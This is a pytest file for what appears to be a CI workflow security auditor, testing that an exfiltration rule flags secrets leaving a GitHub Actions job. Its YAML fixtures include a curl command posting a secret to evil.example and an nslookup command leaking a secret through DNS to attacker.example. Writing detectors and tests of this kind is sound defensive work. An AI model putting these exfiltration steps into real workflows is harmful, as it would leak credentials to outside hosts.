# tests/test_workflow_rule_exfil.py
from credence.workflow_audit.parser import parse_workflow
from credence.workflow_audit.taint import resolve_job
from credence.workflow_audit.rules import RuleContext
import credence.workflow_audit.rules.exfil_rules as exfil_rules


def _run001(text):
    wf = parse_workflow(text, path="x")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    return list(exfil_rules.wf_exfil_001(wf, resolved, RuleContext()))


ENV_MAPPED = """
on: push
jobs:
  b:
    runs-on: x
    env:
      TOKEN: ${{ secrets.PROD }}
    steps:
      - run: curl -d "$TOKEN" https://evil.example/collect
"""
DNS_EXFIL = """
on: push
jobs:
  b:
    runs-on: x
    steps:
      - env:
          S: ${{ secrets.PROD }}
        run: nslookup "$S.attacker.example"
"""
BENIGN_DEPLOY = """
on: push
jobs:
  b:
    runs-on: x
    env:
      TOKEN: ${{ secrets.PROD }}
    steps:
      - run: curl -H "Authorization: $TOKEN" https://api.github.com/repos/me/me/deployments
"""


def test_env_mapped_secret_to_foreign_host_high():
    out = _run001(ENV_MAPPED)
    assert any(f.rule_id == "WF-EXFIL-001" and f.severity.value in ("HIGH", "CRITICAL")
               for f in out)


def test_dns_exfil_of_secret_fires():
    out = _run001(DNS_EXFIL)
    assert any(f.rule_id == "WF-EXFIL-001" for f in out)


def test_secret_to_platform_host_same_api_not_high():
    # talking to api.github.com is not treated as foreign-host exfil (no finding here)
    out = _run001(BENIGN_DEPLOY)
    assert all(f.severity.value not in ("HIGH", "CRITICAL") for f in out)
